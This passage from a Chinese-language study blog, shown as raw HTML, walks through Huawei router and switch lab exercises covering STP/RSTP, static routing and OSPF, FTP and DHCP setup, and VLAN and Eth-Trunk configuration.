this<br></code></pre></div></td></tr></table></figure></li><li><p>退出</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 退出系统<br>return<br># 返回上一级<br>quit<br></code></pre></div></td></tr></table></figure></li><li><p>配置接口地址和描述信息</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入对应端口<br>interface GigabitEthernet <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 设置IP地址和描述信息<br>ip address <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">13</span>.<span class="hljs-number">1</span> <span class="hljs-number">24</span><br># 当前界面下查看配置结果<br>display this<br></code></pre></div></td></tr></table></figure></li><li><p>查看接口信息</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">display interface G0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure></li><li><p>查看当前设备上存储的文件列表</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 查看当前目录下文件列表<br><span class="hljs-built_in">dir</span><br></code></pre></div></td></tr></table></figure></li><li><p>管理设备配置文件</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 查看保存的配置文件<br>display saved-configuration<br># 保存<br>save<br># 查看当前配置信息<br>display current-configuration<br># 查看下次启动使用的配置文件<br>display startup<br># 删除闪存中的配置文件<br>reset saved-configuration<br></code></pre></div></td></tr></table></figure></li><li><p>重启设备</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">reboot<br></code></pre></div></td></tr></table></figure></li></ol><h2 id="实验三-STP和RSTP"><a href="#实验三-STP和RSTP" class="headerlink" title="实验三 STP和RSTP"></a>实验三 STP和RSTP</h2><h3 id="3-1-STP配置"><a href="#3-1-STP配置" class="headerlink" title="3.1 STP配置"></a>3.1 STP配置</h3><p>实验拓扑图</p><p><img src="https://pic.imgdb.cn/item/60f538355132923bf8b5a6d8.png"></p><p>为保证结果的准确性需要关闭无关的端口</p><p>S1上的1,2,3,13,14</p><p>S2上的1,2,3,6,7</p><h4 id="3-1-1-基础配置"><a href="#3-1-1-基础配置" class="headerlink" title="3.1.1 基础配置"></a>3.1.1 基础配置</h4><p>启用STP</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">stp enable<br></code></pre></div></td></tr></table></figure><p>在S1，S2启用STP并将S1配置为根桥</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 设备启用stp<br>stp <span class="hljs-built_in">mode</span> stp<br># 设置为根桥<br>stp root primary<br># 其他<br>stp root secondary<br># 查看STP信息<br>dispaly stp brief<br># 查看端口的STP状态<br>display stp interface G0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h4 id="3-1-2-控制根桥选举"><a href="#3-1-2-控制根桥选举" class="headerlink" title="3.1.2 控制根桥选举"></a>3.1.2 控制根桥选举</h4><p>查看根桥信息</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">display stp<br></code></pre></div></td></tr></table></figure><p>查看本机mac</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">display bridge mac-address<br></code></pre></div></td></tr></table></figure><p>分别进入两个交换机中</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 首先不设置root<br>undo stp root<br># 设置优先级<br>stp priority <span class="hljs-number">8192</span> # S1<br>stp priority <span class="hljs-number">4096</span> # S2<br></code></pre></div></td></tr></table></figure><p>注：桥优先级值越低，优先级越高</p><p>故此时S2为根桥</p><p>当S2故障时，S1转变为根桥</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 设置S2接口关闭，模拟故障<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">9</span><br>shutdown # 关闭<br><br><br>undo shutdown #开启，此处不用<br></code></pre></div></td></tr></table></figure><h4 id="3-1-3-控制根端口选举"><a href="#3-1-3-控制根端口选举" class="headerlink" title="3.1.3 控制根端口选举"></a>3.1.3 控制根端口选举</h4><p>使用命令<code>display stp brief</code>查看端口角色</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 首先进入对应的端口<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">9</span><br># 设置优先级<br>stp port priority <span class="hljs-number">32</span> # 数值越小优先级越高<br></code></pre></div></td></tr></table></figure><p>修改完成后，端口角色会按照修改的优先级大小选择根端口</p><h3 id="3-2-RSTP配置"><a href="#3-2-RSTP配置" class="headerlink" title="3.2 RSTP配置"></a>3.2 RSTP配置</h3><p>实验拓扑图</p><p><img src="https://pic.imgdb.cn/item/60f53dbe5132923bf8d48c34.png"></p><p>首先依旧是关闭无关的端口</p><p>S1上的1,2,3,13,14</p><p>S2上的1,2,3,6,7</p><p>设置为RSTP模式</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">stp <span class="hljs-built_in">mode</span> rstp<br></code></pre></div></td></tr></table></figure><p>配置边缘端口</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入对应端口<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br># 打开端口<br>undo shutdown <br># 设置为边缘端口<br>stp edged-port enable<br></code></pre></div></td></tr></table></figure><p>配置BPDU保护功能</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">stp bpdu-protection<br></code></pre></div></td></tr></table></figure><p>配置环路保护功能</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入对应端口<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">9</span><br># 配置环路保护<br>stp loop-protection<br></code></pre></div></td></tr></table></figure><h2 id="实验四-路由配置"><a href="#实验四-路由配置" class="headerlink" title="实验四 路由配置"></a>实验四 路由配置</h2><h3 id="4-1-配置静态路由和缺省路由"><a href="#4-1-配置静态路由和缺省路由" class="headerlink" title="4.1 配置静态路由和缺省路由"></a>4.1 配置静态路由和缺省路由</h3><p><img src="https://pic.imgdb.cn/item/60f53f5b5132923bf8dd460a.png"></p><p>配置路由名和对应端口的ip</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 对应G0/<span class="hljs-number">0</span>/端口配置:略<br># 进入端口<br>interface LoopBack0<br>ip address <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">24</span><br></code></pre></div></td></tr></table></figure><p>查看端口ip情况</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">display ip interface brief<br></code></pre></div></td></tr></table></figure><p>查看路由表</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">display ip routing-table<br></code></pre></div></td></tr></table></figure><p>配置静态路由</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 设置静态路由<br>ip route-static <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span> <span class="hljs-number">24</span> <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">23</span>.<span class="hljs-number">3</span> # 前一个地址为需要跳转的地址，后一个为下一跳地址<br><br># 设置静态路由优先级<br>ip route-static <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span> <span class="hljs-number">24</span> <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>.<span class="hljs-number">1</span> preference <span class="hljs-number">80</span> # 越大优先级越低<br></code></pre></div></td></tr></table></figure><p>配置缺省</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 整体类似静态路由设置，只是设置的优先级较低最后执行，且所有未找到的地址都执行<br>ip route-static <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>.<span class="hljs-number">2</span> preference <span class="hljs-number">80</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-OSPF-单区域配置"><a href="#4-2-OSPF-单区域配置" class="headerlink" title="4.2 OSPF 单区域配置"></a>4.2 OSPF 单区域配置</h3><p>实验拓扑图</p><p><img src="https://pic.imgdb.cn/item/60f541915132923bf8e95ac2.png"></p><p>配置OSPF</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 设置Router ID 开启OSPF进程<span class="hljs-number">1</span><br>ospf <span class="hljs-number">1</span> router-id <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br># 进入OSPF区域<br>area <span class="hljs-number">0</span><br># 发布网段到OSPF区域<span class="hljs-number">0</span><br>network <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span><br>network <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span><br>network <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span><br></code></pre></div></td></tr></table></figure><p>注意：同一个路由器可以开启多个OSPF进程，默认进程号为1，由于进程号只具有本地意义，所以同一路由域的不同路由器可以使用相同或不同的OSPF进程号。另外network命令后面需使用反掩码</p><p>在配置完成后需要等待一段时间</p><p>使用<code>display ip routing-table</code>查看配置情况</p><p>查看OSPF邻居状态</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 详细信息<br>display ospf peer # 可查看邻居状态和DR BDR<br># 简略点<br>display ospf peer brief # 查看邻居状态<br></code></pre></div></td></tr></table></figure><p>修改OSPF hello 和 dead时间参数</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 首先查看对应端口的OSPF内容<br>display ospf interface G0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 进入端口修改内容<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>ospf timer hello <span class="hljs-number">15</span><br>ospf timer dead <span class="hljs-number">60</span><br></code></pre></div></td></tr></table></figure><p>此时由于端口对应的参数不一致，所以邻居减少一个</p><p>此时进入S3进行对应端口的修改后，等待小段时间后重新建立邻居关系</p><p>OSPF缺省路由发布及验证</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 配置缺省路由并发布到OSPF域内<br>ip route-static <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> LoopBack2<br>ospf <span class="hljs-number">1</span><br>default-route-advertise<br></code></pre></div></td></tr></table></figure><p>之后其他路由均会学习到该缺省路由</p><h4 id="4-2-1-控制OSPF-DR-BDR的选举"><a href="#4-2-1-控制OSPF-DR-BDR的选举" class="headerlink" title="4.2.1 控制OSPF DR/BDR的选举"></a>4.2.1 控制OSPF DR/BDR的选举</h4><p>查看对应地址的角色</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat">display ospf peer <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>.<span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure><p>修改对应端口的优先级</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入对应端口<br>int G <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br># 设置ospf的优先级<br>ospf dr-priority <span class="hljs-number">200</span> # 数值越大优先级越高<br></code></pre></div></td></tr></table></figure><p>由于DR/BDR采用的是非抢占模式，需要重置R1,R3的邻居关系(关闭对应端口)，才能重新得到想要的DR/BDR关系</p><h2 id="实验五-FTP和DHCP"><a href="#实验五-FTP和DHCP" class="headerlink" title="实验五 FTP和DHCP"></a>实验五 FTP和DHCP</h2><h3 id="5-1-FTP配置"><a href="#5-1-FTP配置" class="headerlink" title="5.1 FTP配置"></a>5.1 FTP配置</h3><p>实验拓扑图</p><p><img src="https://pic.imgdb.cn/item/60f692eb5132923bf849321c.png"></p><h4 id="5-1-1-实验准备"><a href="#5-1-1-实验准备" class="headerlink" title="5.1.1 实验准备"></a>5.1.1 实验准备</h4><p>将R1，R2的名称和对应端口修改为上图(ip:最后为1，2)</p><h4 id="5-1-2-启用FTP业务"><a href="#5-1-2-启用FTP业务" class="headerlink" title="5.1.2 启用FTP业务"></a>5.1.2 启用FTP业务</h4><p>默认情况下未启动FTP功能，需要手动启动，设置R1为服务器</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 启动FTP功能<br>ftp server enable<br># 设置默认目录<br><span class="hljs-built_in">set</span> default ftp-directory flash:/<br></code></pre></div></td></tr></table></figure><p>在AAA中设置用户密码，授权合法的用户连接</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入用户设置<br>aaa<br># 添加用户<br>local-user huawei(用户名) password cipher <span class="hljs-number">123</span>(密码)<br># 添加用户信息到ftp中<br>local-user huawei service-<span class="hljs-built_in">type</span> ftp<br># 更改用户的权限<br>local-user huawei privilege level <span class="hljs-number">15</span><br>local-user huawei ftp-directory flash:<br><br><br># 展示ftp相关信息<br>display ftp-server<br></code></pre></div></td></tr></table></figure><h4 id="5-1-3-建立FTP客户端与服务端的连接"><a href="#5-1-3-建立FTP客户端与服务端的连接" class="headerlink" title="5.1.3 建立FTP客户端与服务端的连接"></a>5.1.3 建立FTP客户端与服务端的连接</h4><p>return后进行连接</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 连接客户端<br>ftp ip<br># 输入用户名和密码<br># 下载内容<br>get 文件名<br># 上传内容<br>put 文件 新文件名<br></code></pre></div></td></tr></table></figure><h3 id="5-2-配置DHCP"><a href="#5-2-配置DHCP" class="headerlink" title="5.2 配置DHCP"></a>5.2 配置DHCP</h3><p>实验拓扑图：</p><p><img src="https://pic.imgdb.cn/item/60f695975132923bf852d443.png"></p><h4 id="5-2-1-实验环境准备"><a href="#5-2-1-实验环境准备" class="headerlink" title="5.2.1 实验环境准备"></a>5.2.1 实验环境准备</h4><p>设置路由器和交换机的接口ip和名称</p><p>关闭无关的端口</p><h4 id="5-2-2-启用DHCP功能和创建IP池"><a href="#5-2-2-启用DHCP功能和创建IP池" class="headerlink" title="5.2.2 启用DHCP功能和创建IP池"></a>5.2.2 启用DHCP功能和创建IP池</h4><p>启用DHCP功能</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 启用DHCP功能<br>dhcp enable<br></code></pre></div></td></tr></table></figure><p>在路由器上创建IP池</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 创建IP池<br>ip pool pool1<br># 进入IP池后设置地址范围<br>network <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">24</span><br># 设置网关<br>gateway-list <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span>.<span class="hljs-number">1</span><br># 设置租期<br>lease day <span class="hljs-number">1</span> hour <span class="hljs-number">12</span><br><br><br># 进入接口设置<br>int G <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br>dhcp select global<br><br><br># 查看IP池参数<br>display ip pool name (IP池名)<br></code></pre></div></td></tr></table></figure><p>配置交换机通过缺省管理端口VLANIF1向DHCP服务器申请IP地址</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 开启DHCP服务<br>dhcp enable<br># 进入端口<br>interface Vlanif <span class="hljs-number">1</span><br># 设置地址通过DHCP获取<br>ip address dhcp-alloc<br><br># 通过查看接口地址可了解设置<br>display ip interface brief<br><br></code></pre></div></td></tr></table></figure><h4 id="5-2-3-创建接口地址池"><a href="#5-2-3-创建接口地址池" class="headerlink" title="5.2.3 创建接口地址池"></a>5.2.3 创建接口地址池</h4><p>执行<code>dhcp select interface</code> 命令开启接口的DHCP服务，指定路由器从接口地址池分配地址</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 首先进入接口<br>int G <span class="hljs-number">0</span>/<span class="hljs-number">0</span>/<span class="hljs-number">2</span><br># 设置接口开启DHCP服务<br>dhcp select interface<br># 设置具体内容 <br>dhcp server dns-list <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">23</span>.<span class="hljs-number">254</span><br>dhcp server excluded-ip-address <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">23</span>.<span class="hljs-number">254</span><br># 设置租期<br>dhcp server lease day <span class="hljs-number">1</span> hour <span class="hljs-number">12</span><br><br># 路由器执行查看接口地址池参数<br>display ip pool interface<br></code></pre></div></td></tr></table></figure><h2 id="实验六-以太网与VLAN"><a href="#实验六-以太网与VLAN" class="headerlink" title="实验六 以太网与VLAN"></a>实验六 以太网与VLAN</h2><h3 id="6-1-VLAN配置"><a href="#6-1-VLAN配置" class="headerlink" title="6.1 VLAN配置"></a>6.1 VLAN配置</h3><p>实验拓扑图</p><p><img src="https://pic.imgdb.cn/item/60f6ba6e5132923bf8c85b58.png"></p><h4 id="6-1-1-实验环境准备"><a href="#6-1-1-实验环境准备" class="headerlink" title="6.1.1 实验环境准备"></a>6.1.1 实验环境准备</h4><p>在S1和S2上创建Eth-Trunk 1并配置为静态LACP模式，再将接口9/10加入Eth-Trunk1</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 创建链路聚合的负债分担<br>interface Eth-trunk <span class="hljs-number">1</span><br># 设置为LACP模式<br><span class="hljs-built_in">mode</span> lacp<br># 进入端口添加进入Eth-Trunk1<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">9</span><br>eth-trunk1<br><br></code></pre></div></td></tr></table></figure><h4 id="6-1-2-关闭不相关接口，并配置Trunk"><a href="#6-1-2-关闭不相关接口，并配置Trunk" class="headerlink" title="6.1.2 关闭不相关接口，并配置Trunk"></a>6.1.2 关闭不相关接口，并配置Trunk</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入链路聚合<br>int Eth-trunk1<br># 设置端口类型为Trunk<br>port link-<span class="hljs-built_in">type</span> trunk<br># 允许所有vlan通过<br>port trunk allow-pass vlan all<br></code></pre></div></td></tr></table></figure><h4 id="6-1-3-创建VLAN"><a href="#6-1-3-创建VLAN" class="headerlink" title="6.1.3 创建VLAN"></a>6.1.3 创建VLAN</h4><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入接口<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">13</span><br># 设置接口类型<br>port link-<span class="hljs-built_in">type</span> access<br># 创建VLAN<br>vlan <span class="hljs-number">2</span><br># 创建VLAN多<br>vlan batch <span class="hljs-number">2</span> to <span class="hljs-number">4</span><br># 设置端口对应的vlan<br>int 接口<br># 设置接口类型<br>port link-<span class="hljs-built_in">type</span> access<br># 设置vlan<br>port default vlan <span class="hljs-number">2</span><br><br># 查看vlan信息<br>display vlan<br></code></pre></div></td></tr></table></figure><h4 id="6-1-4-客户端配置IP地址"><a href="#6-1-4-客户端配置IP地址" class="headerlink" title="6.1.4 客户端配置IP地址"></a>6.1.4 客户端配置IP地址</h4><p>由于无法为交换机的网络接口配置IP地址，所有使用本地管理接口VLANIF1 作为用户接口，并配置IP地址</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 交换机中进入vlanif1<br>int vlanif1<br>ip add <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span> <span class="hljs-number">24</span><br></code></pre></div></td></tr></table></figure><h4 id="6-1-5-配置Hybrid端口"><a href="#6-1-5-配置Hybrid端口" class="headerlink" title="6.1.5 配置Hybrid端口"></a>6.1.5 配置Hybrid端口</h4><p>在S1的0/0/1端口配置类型为Hybrid端口并转发时去掉VLAN2，VLAN 4的标签</p><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 进入接口<br>int G0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br># 取消之前设置<br>undo port default vlan<br># 设置端口hybrid类型<br>port link-<span class="hljs-built_in">type</span> hybrid <br># 设置数据帧的去除标签<br>port hybrid untagged vlan <span class="hljs-number">2</span> <span class="hljs-number">4</span><br># 配置端口收到数据帧时需要给数据帧添加的VLAN标签<br>port hybrid pvid vlan <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><h3 id="6-2-VLAN间路由配置"><a href="#6-2-VLAN间路由配置" class="headerlink" title="6.2 